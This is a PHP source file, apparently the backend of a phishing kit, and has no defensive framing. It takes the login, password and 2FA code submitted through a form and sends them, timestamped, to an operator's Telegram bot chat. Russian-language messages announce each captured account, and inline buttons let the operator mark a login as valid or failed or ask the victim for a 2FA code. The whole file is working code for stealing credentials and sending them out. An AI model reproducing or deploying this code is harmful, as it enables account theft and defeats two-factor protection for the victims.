<?php
$login = $_POST['login'];
$password = $_POST['password'];
date_default_timezone_set("Europe/Moscow");

function Notify($type, $id) {
    $true_link = '/true '.$id;
    $false_link = '/false '.$id;
    $two_auth_link = '/2fa '.$id;

    global $token, $chat_id, $login, $password;

    switch($type) {
        case 'check':
            $message_check =
                "<b>📥 Получен новый аккаунт!</b>
        
<b>🎯 Статус: Проверка</b>

<b>🤖 Логин: <code>".$login."</code></b>
<b>🔑 Пароль: <code>".$password."</code></b>

<b>🕘 Время: ".date('d.m.Y G:i')."</b>";

            $message_check = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message_check) . '&reply_markup={"inline_keyboard":[[{"text":"✅ Успешно!","callback_data":"'.$true_link.'"},{"text":"❌ Неуспешно!","callback_data":"'.$false_link.'"}],[{"text":"🔐 2FA!","callback_data":"'.$two_auth_link.'"}]]}&parse_mode=html';
            file_get_contents($message_check);
            break;

        case '2fa_check':
            $message_2fa_check =
                "<b>🔐 Проверка 2FA</b>
        
<b>🤖 Логин: <code>".$login."</code></b>
<b>🔑 Пароль: <code>".$password."</code></b>
<b>🔐 2FA: <code>".$_POST['2fa']."</code></b>

<b>🕘 Время: ".date('d.m.Y G:i')."</b>";

            $message_2fa_check = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message_2fa_check) . '&reply_markup={"inline_keyboard":[[{"text":"✅ Успешно!","callback_data":"'.$true_link.'"},{"text":"❌ Неуспешно!","callback_data":"'.$false_link.'"}]]}&parse_mode=html';
            file_get_contents($message_2fa_check);
            break;

        case 'true':
            $message_true =
                "<b>✅ Успешно!</b>
            
<b>🤖 Логин: <code>".$login."</code></b>
<b>🔑 Пароль: <code>".$password."</code></b>

<b>🕘 Время: ".date('d.m.Y G:i')."</b>";

            $message_true = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message_true) . '&parse_mode=html';
            file_get_contents($message_true);
            break;

        case 'false':
            $message_false =
                "<b>❌ Неуспешно!</b>
            
<b>🤖 Логин: <code>".$login."</code></b>
<b>🔑 Пароль: <code>".$password."</code></b>

<b>🕘 Время: ".date('d.m.Y G:i')."</b>";

            $message_false = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message_false) . '&parse_mode=html';
            file_get_contents($message_false);
            break;

        case '2fa':
            $message_2fa =
                "<b>🔐 Ожидание 2FA!</b>

<b>🤖 Логин: <code>".$login."</code></b>
<b>🔑 Пароль: <code>".$password."</code></b>

<b>🕘 Время: ".date('d.m.Y G:i')."</b>";

            $message_2fa = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message_2fa) . '&parse_mode=html';
            file_get_contents($message_2fa);
            break;
    }
}